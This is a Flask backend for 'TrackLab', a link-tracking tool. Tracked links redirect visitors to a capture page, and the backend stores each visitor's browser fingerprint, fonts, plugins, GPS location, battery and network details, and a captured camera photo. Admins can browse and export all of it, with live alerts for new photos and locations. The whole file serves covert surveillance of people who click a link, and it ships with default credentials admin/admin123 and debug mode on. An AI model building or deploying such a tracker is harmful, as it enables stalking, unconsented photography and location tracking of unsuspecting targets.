"""
TrackLab — Flask Backend
API REST completa + SSE (Server-Sent Events) para tempo real
"""
from flask import (Flask, request, jsonify, render_template, session,
                   redirect, url_for, Response)
from functools import wraps
from datetime import datetime, timedelta
from collections import Counter
from pathlib import Path
import sqlite3, json, hashlib, secrets, re, queue, threading, time, os, sys, base64

sys.path.insert(0, os.path.dirname(__file__))
from database import get_db, init_db, hash_password, db_stats, DB_PATH

EVENT_LOG_PATH = Path(__file__).resolve().parent.parent / 'security_events.jsonl'

app = Flask(
    __name__,
    template_folder=os.path.join(os.path.dirname(__file__), '..', 'frontend', 'templates'),
    static_folder=os.path.join(os.path.dirname(__file__), '..', 'frontend', 'static'),
)
app.secret_key = secrets.token_hex(32)

# SSE clients registry
sse_clients: list[queue.Queue] = []
sse_lock = threading.Lock()

def sse_broadcast(event: str, data: dict):
    msg = f"event: {event}\ndata: {json.dumps(data)}\n\n"
    with sse_lock:
        dead = []
        for q in sse_clients:
            try:
                q.put_nowait(msg)
            except queue.Full:
                dead.append(q)
        for q in dead:
            sse_clients.remove(q)

# ─── Auth helpers ─────────────────────────────────────────────────────────────
def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get('user_id'):
            if request.is_json:
                return jsonify({'error': 'Unauthorized'}), 401
            return redirect(url_for('login_page'))
        return f(*args, **kwargs)
    return decorated

def admin_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get('user_id'):
            if request.is_json:
                return jsonify({'error': 'Unauthorized'}), 401
            return redirect(url_for('login_page'))
        if session.get('role') != 'admin':
            return jsonify({'error': 'Forbidden'}), 403
        return f(*args, **kwargs)
    return decorated

def api_key_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        key = request.headers.get('X-API-Key') or request.args.get('api_key')
        if not key:
            return jsonify({'error': 'API key required'}), 401
        key_hash = hashlib.sha256(key.encode()).hexdigest()
        conn = get_db()
        row = conn.execute("SELECT id FROM api_keys WHERE key_hash=? AND active=1", (key_hash,)).fetchone()
        if not row:
            conn.close()
            return jsonify({'error': 'Invalid API key'}), 401
        conn.execute("UPDATE api_keys SET last_used=datetime('now') WHERE key_hash=?", (key_hash,))
        conn.commit()
        conn.close()
        return f(*args, **kwargs)
    return decorated

def parse_user_agent(ua: str) -> dict:
    if not ua:
        return {'browser': 'Unknown', 'browser_ver': '', 'os': 'Unknown', 'os_ver': '', 'device': 'Desktop'}
    b, bv, o, ov, dev = 'Other', '', 'Other', '', 'Desktop'
    if re.search(r'OPR|Opera', ua): b = 'Opera'; m = re.search(r'OPR/([\d.]+)', ua); bv = m.group(1) if m else ''
    elif re.search(r'Edg/', ua): b = 'Edge'; m = re.search(r'Edg/([\d.]+)', ua); bv = m.group(1) if m else ''
    elif re.search(r'Chrome/', ua): b = 'Chrome'; m = re.search(r'Chrome/([\d.]+)', ua); bv = m.group(1) if m else ''
    elif re.search(r'Firefox/', ua): b = 'Firefox'; m = re.search(r'Firefox/([\d.]+)', ua); bv = m.group(1) if m else ''
    elif re.search(r'Safari/', ua) and 'Chrome' not in ua: b = 'Safari'; m = re.search(r'Version/([\d.]+)', ua); bv = m.group(1) if m else ''
    if 'Windows NT 10' in ua: o, ov = 'Windows', '10/11'
    elif 'Windows NT 6.3' in ua: o, ov = 'Windows', '8.1'
    elif 'Mac OS X' in ua: o = 'macOS'; m = re.search(r'Mac OS X ([\d_]+)', ua); ov = m.group(1).replace('_','.') if m else ''
    elif 'Android' in ua: o = 'Android'; m = re.search(r'Android ([\d.]+)', ua); ov = m.group(1) if m else ''
    elif 'iPhone' in ua or 'iPad' in ua: o = 'iOS'; m = re.search(r'OS ([\d_]+)', ua); ov = m.group(1).replace('_','.') if m else ''
    elif 'Linux' in ua: o = 'Linux'
    if 'Mobile' in ua or 'Android' in ua: dev = 'Mobile'
    elif 'Tablet' in ua or 'iPad' in ua: dev = 'Tablet'
    return {'browser': b, 'browser_ver': bv, 'os': o, 'os_ver': ov, 'device': dev}


def read_event_log() -> list[dict]:
    if not EVENT_LOG_PATH.exists():
        return []
    events = []
    for line in EVENT_LOG_PATH.read_text(encoding='utf-8', errors='ignore').splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            events.append(json.loads(line))
        except json.JSONDecodeError:
            continue
    return events


def network_event_stats() -> dict:
    events = read_event_log()
    if not events:
        return {
            'network_events_total': 0,
            'network_types': {},
            'network_top_ports': {},
            'network_top_ips': {},
            'network_recent': [],
            'network_events': [],
        }

    network_types = Counter()
    top_ports = Counter()
    top_ips = Counter()
    recent = []
    network_types_set = {
        'port_new', 'dns_seen', 'http_seen', 'arp_seen', 'host_discovery',
        'dns_tunnel', 'arp_spoof', 'ids_alert', 'process_anomaly', 'fim_changed',
    }

    for ev in events:
        etype = ev.get('type', 'unknown')
        if etype not in network_types_set:
            continue
        network_types[etype] += 1
        protocol = str(ev.get('protocol') or ev.get('proto') or etype)
        ip = ev.get('ip') or ev.get('src') or ev.get('host_ip')
        port = ev.get('port')
        if ev.get('port') is not None:
            top_ports[str(ev.get('port'))] += 1
        else:
            m = re.search(r'port=(\d+)', str(ev.get('details', '')))
            if m:
                top_ports[m.group(1)] += 1
        if ip:
            top_ips[str(ip)] += 1
        recent.append({
            'ts': ev.get('ts'),
            'type': etype,
            'source': ev.get('source'),
            'details': str(ev.get('details', ''))[:180],
            'severity': ev.get('severity', 'low'),
            'ip': ip,
            'port': port,
            'protocol': protocol,
        })

    ordered_recent = list(reversed(recent))

    return {
        'network_events_total': sum(network_types.values()),
        'network_types': dict(network_types),
        'network_top_ports': dict(top_ports.most_common(8)),
        'network_top_ips': dict(top_ips.most_common(8)),
        'network_recent': ordered_recent[:10],
        'network_events': ordered_recent[:200],
    }

# ─── Pages ────────────────────────────────────────────────────────────────────
@app.route('/')
def index():
    ref = request.args.get('ref')
    return render_template('index.html', ref=ref or '')

@app.route('/capture')
def capture_page():
    ref = request.args.get('ref', '')
    return render_template('capture.html', ref=ref)

@app.route('/dashboard')
@admin_required
def dashboard_page():
    return render_template('dashboard.html')

@app.route('/admin/photos')
@admin_required
def photos_page():
    return render_template('photos.html')

@app.route('/admin/links')
@admin_required
def links_page():
    return render_template('links.html')

@app.route('/admin/sessions')
@admin_required
def sessions_page():
    return render_template('sessions.html')

@app.route('/admin/security-tools')
@admin_required
def security_tools_page():
    return render_template('security_manual.html', active='security_tools')

@app.route('/login')
def login_page():
    if session.get('user_id'):
        return redirect(url_for('dashboard_page'))
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login_page'))

# ─── Auth API ─────────────────────────────────────────────────────────────────
@app.route('/api/auth/login', methods=['POST'])
def api_login():
    data = request.get_json()
    if not data:
        return jsonify({'error': 'No data'}), 400
    conn = get_db()
    user = conn.execute(
        "SELECT * FROM users WHERE username=? AND password=?",
        (data.get('username'), hash_password(data.get('password', '')))
    ).fetchone()
    conn.close()
    if not user:
        return jsonify({'error': 'Credenciais inválidas'}), 401
    session['user_id'] = user['id']
    session['username'] = user['username']
    session['role'] = user['role']
    return jsonify({'ok': True, 'username': user['username'], 'role': user['role']})

@app.route('/api/auth/me')
def api_me():
    if not session.get('user_id'):
        return jsonify({'authenticated': False}), 401
    return jsonify({'authenticated': True, 'username': session['username'], 'role': session['role']})

# ─── Session API ──────────────────────────────────────────────────────────────
@app.route('/api/session', methods=['POST'])
def api_save_session():
    data = request.get_json()
    if not data:
        return jsonify({'error': 'No data'}), 400

    ua_info = parse_user_agent(data.get('userAgent', ''))
    sid = data.get('sessionId') or secrets.token_hex(8).upper()

    # Handle ref link hit
    ref = data.get('refLinkId')
    if ref:
        conn = get_db()
        try:
            link = conn.execute("SELECT id FROM tracked_links WHERE link_id=?", (ref,)).fetchone()
            if link:
                conn.execute("UPDATE tracked_links SET total_hits=total_hits+1 WHERE link_id=?", (ref,))
                prev = conn.execute("SELECT id FROM link_hits WHERE link_id=? AND ip=?",
                                    (ref, request.remote_addr)).fetchone()
                if not prev:
                    conn.execute("UPDATE tracked_links SET unique_hits=unique_hits+1 WHERE link_id=?", (ref,))
                conn.execute("INSERT INTO link_hits (link_id, session_id, ip, user_agent, referer) VALUES (?,?,?,?,?)",
                             (ref, sid, request.remote_addr, data.get('userAgent'), request.headers.get('Referer')))
                conn.commit()
        finally:
            conn.close()

    conn = get_db()
    geo = data.get('geo') or {}
    try:
        conn.execute("""
            INSERT OR REPLACE INTO sessions
            (session_id, ip, user_agent, browser, browser_ver, os, os_ver, device_type,
             screen, viewport, color_depth, pixel_ratio, language, languages, timezone,
             cpu_cores, memory_gb, touch_points, cookies, dnt, online,
             webgl, fingerprint, canvas_hash, fonts, plugins,
             ref_link_id, geo_lat, geo_lng, geo_accuracy, geo_city,
             battery_level, battery_charging, connection_type, connection_speed, has_photo)
            VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)
        """, (
            sid,
            request.remote_addr,
            data.get('userAgent'),
            ua_info['browser'], ua_info['browser_ver'],
            ua_info['os'], ua_info['os_ver'], ua_info['device'],
            data.get('screen'), data.get('viewport'),
            data.get('colorDepth'), data.get('pixelRatio'),
            data.get('language'), data.get('languages'),
            data.get('timezone'),
            data.get('cpuCores'), data.get('memoryGb'),
            data.get('touchPoints'), int(bool(data.get('cookies'))),
            int(bool(data.get('dnt'))), int(bool(data.get('online'))),
            data.get('webgl'), data.get('fingerprint'), data.get('canvasHash'),
            json.dumps(data.get('fonts', [])), json.dumps(data.get('plugins', [])),
            ref,
            geo.get('lat'), geo.get('lng'), geo.get('accuracy'), geo.get('city'),
            data.get('batteryLevel'), int(bool(data.get('batteryCharging'))),
            data.get('connectionType'), data.get('connectionSpeed'),
            int(bool(data.get('photo')))
        ))
        conn.commit()

        # Save photo separately
        if data.get('photo'):
            photo_data = data['photo']
            size = len(photo_data.encode('utf-8'))
            conn.execute("INSERT INTO photos (session_id, data_url, size_bytes) VALUES (?,?,?)",
                         (sid, photo_data, size))
            conn.commit()

        # Create alert
        conn.execute("INSERT INTO alerts (type, session_id, message) VALUES (?,?,?)",
                     ('new_session', sid, f"Nova sessão de {request.remote_addr} — {ua_info['browser']} / {ua_info['os']}"))
        if data.get('photo'):
            conn.execute("INSERT INTO alerts (type, session_id, message) VALUES (?,?,?)",
                         ('new_photo', sid, f"Foto capturada na sessão {sid}"))
        if geo.get('lat'):
            conn.execute("INSERT INTO alerts (type, session_id, message) VALUES (?,?,?)",
                         ('geo_detected', sid, f"Localização detectada: {geo.get('lat'):.4f}, {geo.get('lng'):.4f}"))
        conn.commit()
        conn.close()

        sse_broadcast('new_session', {
            'sessionId': sid, 'ip': request.remote_addr,
            'browser': ua_info['browser'], 'os': ua_info['os'],
            'hasPhoto': bool(data.get('photo')), 'hasGeo': bool(geo.get('lat')),
            'timestamp': datetime.now().isoformat()
        })

        return jsonify({'ok': True, 'sessionId': sid})
    except Exception as e:
        conn.close()
        return jsonify({'error': str(e)}), 500

@app.route('/api/sessions')
@admin_required
def api_sessions():
    page = int(request.args.get('page', 1))
    per = int(request.args.get('per', 20))
    offset = (page - 1) * per
    q = request.args.get('q', '')
    conn = get_db()
    base = "FROM sessions WHERE 1=1"
    params = []
    if q:
        base += " AND (ip LIKE ? OR browser LIKE ? OR os LIKE ? OR fingerprint LIKE ? OR session_id LIKE ?)"
        params += [f'%{q}%'] * 5
    total = conn.execute(f"SELECT COUNT(*) {base}", params).fetchone()[0]
    rows = conn.execute(f"SELECT * {base} ORDER BY created_at DESC LIMIT ? OFFSET ?",
                        params + [per, offset]).fetchall()
    conn.close()
    return jsonify({
        'total': total, 'page': page, 'per': per,
        'sessions': [dict(r) for r in rows]
    })

@app.route('/api/sessions/<sid>')
@admin_required
def api_session_detail(sid):
    conn = get_db()
    s = conn.execute("SELECT * FROM sessions WHERE session_id=?", (sid,)).fetchone()
    photos = conn.execute("SELECT id, size_bytes, created_at FROM photos WHERE session_id=?", (sid,)).fetchall()
    conn.close()
    if not s:
        return jsonify({'error': 'Not found'}), 404
    return jsonify({'session': dict(s), 'photos': [dict(p) for p in photos]})

@app.route('/api/sessions/<sid>', methods=['DELETE'])
@admin_required
def api_delete_session(sid):
    conn = get_db()
    conn.execute("DELETE FROM photos WHERE session_id=?", (sid,))
    conn.execute("DELETE FROM sessions WHERE session_id=?", (sid,))
    conn.commit()
    conn.close()
    return jsonify({'ok': True})

# ─── Photos API ───────────────────────────────────────────────────────────────
@app.route('/api/photos')
@admin_required
def api_photos():
    page = int(request.args.get('page', 1))
    per = int(request.args.get('per', 12))
    offset = (page - 1) * per
    conn = get_db()
    total = conn.execute("SELECT COUNT(*) FROM photos").fetchone()[0]
    rows = conn.execute("""
        SELECT p.id, p.session_id, p.size_bytes, p.created_at,
               s.browser, s.os, s.ip
        FROM photos p LEFT JOIN sessions s ON p.session_id=s.session_id
        ORDER BY p.created_at DESC LIMIT ? OFFSET ?
    """, (per, offset)).fetchall()
    conn.close()
    return jsonify({'total': total, 'photos': [dict(r) for r in rows]})

@app.route('/api/photos/<int:pid>')
@admin_required
def api_photo_full(pid):
    conn = get_db()
    row = conn.execute("SELECT * FROM photos WHERE id=?", (pid,)).fetchone()
    conn.close()
    if not row:
        return jsonify({'error': 'Not found'}), 404
    return jsonify(dict(row))

@app.route('/api/photos/<int:pid>/thumb')
@admin_required
def api_photo_thumb(pid):
    conn = get_db()
    row = conn.execute("SELECT data_url FROM photos WHERE id=?", (pid,)).fetchone()
    conn.close()
    if not row:
        return jsonify({'error': 'Not found'}), 404

    data_url = row['data_url']
    if not data_url or ',' not in data_url:
        return jsonify({'error': 'Invalid image data'}), 400

    header, encoded = data_url.split(',', 1)
    mime = 'image/jpeg'
    m = re.match(r'^data:([^;]+);base64$', header)
    if m:
        mime = m.group(1)
    try:
        img_bytes = base64.b64decode(encoded, validate=True)
    except Exception:
        return jsonify({'error': 'Invalid image payload'}), 400

    return Response(
        img_bytes,
        mimetype=mime,
        headers={'Cache-Control': 'public, max-age=120'}
    )

@app.route('/api/photos/<int:pid>', methods=['DELETE'])
@admin_required
def api_delete_photo(pid):
    conn = get_db()
    conn.execute("DELETE FROM photos WHERE id=?", (pid,))
    conn.commit()
    conn.close()
    return jsonify({'ok': True})

# ─── Links API ────────────────────────────────────────────────────────────────
@app.route('/api/links', methods=['GET'])
@admin_required
def api_get_links():
    conn = get_db()
    rows = conn.execute("SELECT * FROM tracked_links ORDER BY created_at DESC").fetchall()
    conn.close()
    return jsonify({'links': [dict(r) for r in rows]})

@app.route('/api/links', methods=['POST'])
@admin_required
def api_create_link():
    data = request.get_json()
    lid = secrets.token_urlsafe(6).upper()
    conn = get_db()
    conn.execute(
        "INSERT INTO tracked_links (link_id, name, description, target_url, created_by) VALUES (?,?,?,?,?)",
        (lid, data.get('name','Link'), data.get('description',''),
         data.get('targetUrl', '/capture'), session.get('username'))
    )
    conn.commit()
    row = conn.execute("SELECT * FROM tracked_links WHERE link_id=?", (lid,)).fetchone()
    conn.close()
    return jsonify({'ok': True, 'link': dict(row)})

@app.route('/api/links/<lid>', methods=['DELETE'])
@admin_required
def api_delete_link(lid):
    conn = get_db()
    conn.execute("DELETE FROM link_hits WHERE link_id=?", (lid,))
    conn.execute("DELETE FROM tracked_links WHERE link_id=?", (lid,))
    conn.commit()
    conn.close()
    return jsonify({'ok': True})

@app.route('/api/links/<lid>/hits')
@admin_required
def api_link_hits(lid):
    conn = get_db()
    hits = conn.execute(
        "SELECT * FROM link_hits WHERE link_id=? ORDER BY created_at DESC LIMIT 50", (lid,)
    ).fetchall()
    conn.close()
    return jsonify({'hits': [dict(h) for h in hits]})

# Track link redirect
@app.route('/t/<lid>')
def track_redirect(lid):
    conn = get_db()
    link = conn.execute("SELECT * FROM tracked_links WHERE link_id=? AND active=1", (lid,)).fetchone()
    if not link:
        conn.close()
        return redirect('/')
    conn.execute("UPDATE tracked_links SET total_hits=total_hits+1 WHERE link_id=?", (lid,))
    prev = conn.execute("SELECT id FROM link_hits WHERE link_id=? AND ip=?",
                        (lid, request.remote_addr)).fetchone()
    if not prev:
        conn.execute("UPDATE tracked_links SET unique_hits=unique_hits+1 WHERE link_id=?", (lid,))
    conn.execute("INSERT INTO link_hits (link_id, ip, user_agent, referer) VALUES (?,?,?,?)",
                 (lid, request.remote_addr, request.headers.get('User-Agent'), request.headers.get('Referer')))
    target = link['target_url']
    conn.commit()
    conn.close()
    return redirect(f"{target}?ref={lid}")

# ─── Stats & Alerts ───────────────────────────────────────────────────────────
@app.route('/api/stats')
@admin_required
def api_stats():
    stats = db_stats()
    stats.update(network_event_stats())
    return jsonify(stats)

@app.route('/api/alerts')
@admin_required
def api_alerts():
    conn = get_db()
    rows = conn.execute(
        "SELECT * FROM alerts ORDER BY created_at DESC LIMIT 50"
    ).fetchall()
    conn.close()
    return jsonify({'alerts': [dict(r) for r in rows]})

@app.route('/api/alerts/read', methods=['POST'])
@admin_required
def api_mark_read():
    conn = get_db()
    conn.execute("UPDATE alerts SET read=1")
    conn.commit()
    conn.close()
    return jsonify({'ok': True})

# ─── API Keys ─────────────────────────────────────────────────────────────────
@app.route('/api/keys', methods=['GET'])
@admin_required
def api_get_keys():
    conn = get_db()
    rows = conn.execute(
        "SELECT id, label, active, last_used, created_at FROM api_keys ORDER BY created_at DESC"
    ).fetchall()
    conn.close()
    return jsonify({'keys': [dict(r) for r in rows]})

@app.route('/api/keys', methods=['POST'])
@admin_required
def api_create_key():
    data = request.get_json()
    raw = secrets.token_urlsafe(32)
    kh = hashlib.sha256(raw.encode()).hexdigest()
    conn = get_db()
    conn.execute("INSERT INTO api_keys (key_hash, label) VALUES (?,?)",
                 (kh, data.get('label', 'API Key')))
    conn.commit()
    conn.close()
    return jsonify({'ok': True, 'key': raw, 'warning': 'Salve esta chave agora! Ela não será mostrada novamente.'})

@app.route('/api/keys/<int:kid>', methods=['DELETE'])
@admin_required
def api_delete_key(kid):
    conn = get_db()
    conn.execute("DELETE FROM api_keys WHERE id=?", (kid,))
    conn.commit()
    conn.close()
    return jsonify({'ok': True})

# ─── SSE Stream ───────────────────────────────────────────────────────────────
@app.route('/api/stream')
@admin_required
def sse_stream():
    def generate():
        q = queue.Queue(maxsize=50)
        with sse_lock:
            sse_clients.append(q)
        try:
            yield f"data: {json.dumps({'type': 'connected', 'ts': datetime.now().isoformat()})}\n\n"
            while True:
                try:
                    msg = q.get(timeout=25)
                    yield msg
                except queue.Empty:
                    yield ": keepalive\n\n"
        except GeneratorExit:
            with sse_lock:
                if q in sse_clients:
                    sse_clients.remove(q)
    return Response(generate(), mimetype='text/event-stream',
                    headers={'Cache-Control': 'no-cache', 'X-Accel-Buffering': 'no'})

# ─── DB Export ────────────────────────────────────────────────────────────────
@app.route('/api/export/sessions')
@admin_required
def export_sessions():
    conn = get_db()
    rows = conn.execute("SELECT * FROM sessions ORDER BY created_at DESC").fetchall()
    conn.close()
    import csv, io
    out = io.StringIO()
    if rows:
        w = csv.DictWriter(out, fieldnames=rows[0].keys())
        w.writeheader()
        w.writerows([dict(r) for r in rows])
    return Response(out.getvalue(), mimetype='text/csv',
                    headers={'Content-Disposition': 'attachment; filename=sessions.csv'})

if __name__ == '__main__':
    init_db()
    print("=" * 50)
    print("  TrackLab Backend — http://localhost:5000")
    print("  Login: admin / admin123")
    print("=" * 50)
    app.run(debug=True, port=5000, threaded=True)
